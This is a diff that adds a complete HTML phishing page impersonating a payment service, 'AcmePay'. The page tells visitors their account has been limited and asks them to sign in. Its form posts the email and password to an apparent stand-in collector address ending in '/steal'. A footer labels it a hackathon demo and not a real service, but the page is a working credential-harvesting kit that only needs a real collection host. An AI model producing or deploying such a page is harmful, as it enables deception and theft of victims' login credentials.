@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>AcmePay - Secure Sign In</title>
+<style>
+  body { margin: 0; font-family: Arial, Helvetica, sans-serif; background: #f3f6fb; }
+  .top { background: #0b3d91; color: #fff; padding: 18px 40px; font-size: 26px; font-weight: bold; letter-spacing: 1px; }
+  .card { width: 380px; margin: 70px auto; background: #fff; padding: 34px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,.15); }
+  h1 { font-size: 22px; margin: 0 0 6px; color: #0b3d91; }
+  p { color: #555; font-size: 14px; margin: 0 0 20px; }
+  input { width: 100%; box-sizing: border-box; padding: 12px; margin-bottom: 14px; border: 1px solid #bbb; border-radius: 4px; font-size: 15px; }
+  button { width: 100%; padding: 13px; background: #1a73e8; color: #fff; border: 0; border-radius: 4px; font-size: 16px; cursor: pointer; }
+  .small { font-size: 12px; color: #888; text-align: center; margin-top: 18px; }
+</style>
+</head>
+<body>
+<div class="top">AcmePay</div>
+<div class="card">
+  <h1>Verify your account</h1>
+  <p>Your account has been limited. Sign in to restore access.</p>
+  <form action="http://collector.local/steal" method="post">
+    <input type="email" name="email" placeholder="Email address">
+    <input type="password" name="password" placeholder="Password">
+    <button type="submit">Sign in</button>
+  </form>
+  <div class="small">&copy; AcmePay. Demo page for the PS25 hackathon. Not a real service.</div>
+</div>
+</body>
+</html>
